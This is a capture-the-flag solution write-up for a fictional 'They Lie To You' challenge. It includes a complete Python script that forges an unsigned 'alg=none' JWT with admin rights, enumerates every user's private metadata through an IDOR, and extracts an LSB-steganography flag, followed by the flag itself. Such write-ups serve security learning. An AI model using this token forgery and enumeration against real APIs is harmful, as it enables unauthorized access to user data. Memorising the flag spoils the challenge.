# They Lie To You — Chapter 4: Hidden Information

## Challenge description

**Points:** 4

```
Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!
```

## Summary

The dev API mirror (`untraceable-dev-api.theylietoyou.tcc`) accepts JWTs signed with `"alg":"none"` — signature verification is disabled there, while production correctly rejects them. Forging an `ADMIN` token unlocks the admin-only endpoints. `/api/admin/conf` leaks a formula for computing per-user metadata record IDs; enumerating every user's `Data` meta record (an IDOR) reveals that suspect **userId 17 (`ermartinez` / elena.rodriguez)** — the site's most prolific author — hid a PNG instead of the encrypted blob everyone else has. The turtle PNG carries a `tEXt` "Comment" hint (`stegano...`) and the flag is LSB-steganography encoded across its RGBA channels.

## Solution

### Step 1: Bypass JWT auth on the dev environment (`alg=none`)

Earlier recon (Chapter 1) confirmed the `AUTHOR` account (`newWarrior`) is correctly blocked (403) from all `/api/admin/*` routes, and production rejects unsigned tokens. The dev mirror does **not**: a JWT with header `{"alg":"none"}` and an empty signature is accepted. Forging `role: ADMIN` grants full admin access.

### Step 2: Leak the metadata-ID formula, then IDOR every user's `Data`

With the forged admin token, `/api/admin/conf` returns:

```json
{"formula":"metaId = baseOffset + (userId * multiplier) + fieldOffset",
 "offsets":{"Email":23,"Sex":53,"Address":41,"FirstName":11,"LastName":17,"Data":99},
 "multiplier":1000,"baseOffset":154700}
```

`/api/admin/users/{userId}/meta/{metaId}` is a direct-object-reference read. Computing each user's `Data` record (`metaId = 154700 + userId*1000 + 99`) shows all 36 users hold a 128-byte encrypted blob — **except userId 17**, whose `Data` is a ~59 KB base64 **PNG** (a winged turtle). That is the standout suspect the case file pointed to.

### Step 3: Extract the LSB-steganography flag from the PNG

The PNG's `tEXt` chunk has `Comment = base64("stegano.theylietoyou.tcc")` — the word *stegano* is the hint (the host itself doesn't resolve). Reading the least-significant bit of each R, G, B, A sample in order (MSB-first per byte) yields the flag.

```python
#!/usr/bin/env python3
"""Solve: They Lie To You Ch4 — alg=none -> admin IDOR -> RGBA LSB stego."""
import base64, json, re, time, uuid, urllib.request
from io import BytesIO
from PIL import Image
import numpy as np

BASE = "http://untraceable-dev-api.theylietoyou.tcc"

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forged_admin_token():
    now = int(time.time())
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "1", "aud": "tcc-api", "role": "ADMIN", "iss": BASE,
               "exp": now + 3600, "iat": now, "jti": str(uuid.uuid4()), "username": "admin"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."                      # empty signature

def get(path, token):
    req = urllib.request.Request(BASE + path, headers={"Authorization": f"Bearer {token}"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read().decode())

tok = forged_admin_token()

# metadata-ID formula from /api/admin/conf
conf = get("/api/admin/conf", tok)
base_off, mult = conf["baseOffset"], conf["multiplier"]
data_off = conf["offsets"]["Data"]

# IDOR: find the user whose Data record is a PNG, not an encrypted blob
png_b64 = None
for uid in range(1, 37):
    mid = base_off + uid * mult + data_off
    content = get(f"/api/admin/users/{uid}/meta/{mid}", tok)["content"]
    if base64.b64decode(content)[:8] == b"\x89PNG\r\n\x1a\n":
        print(f"[+] userId {uid} hides a PNG")
        png_b64 = content
        break

# LSB stego across RGBA channels, MSB-first per byte
img = Image.open(BytesIO(base64.b64decode(png_b64))).convert("RGBA")
bits = (np.array(img).reshape(-1, 4).flatten() & 1).astype(np.uint8)
out = bytearray(int("".join(map(str, bits[i:i+8])), 2)
                for i in range(0, len(bits) - 7, 8))
print(re.search(rb"FLAG\{[^}]+\}", bytes(out)).group().decode())
```

Output:

```
[+] userId 17 hides a PNG
FLAG{EcfI-bCKg-7x4I-nYlC}
```

## Flag

```
FLAG{EcfI-bCKg-7x4I-nYlC}
```

## Notes / leads for later chapters

- The other 35 users each have a **128-byte** blob in their `Data` field (likely RSA-1024 or AES-encrypted) — probably decoded in a later chapter once a key surfaces.
- Unused-so-far admin endpoints: `POST /api/admin/impersonate/{userId}` (mint a token as any user) and `DELETE /api/comments/{id}`.
- Suspect identified: **userId 17 — `ermartinez`, elena.rodriguez@theylietoyou.tcc**, the most prolific hoax author on the site.
- Extracted artifact saved alongside this file as `ch4_user17_turtle.png`.
```
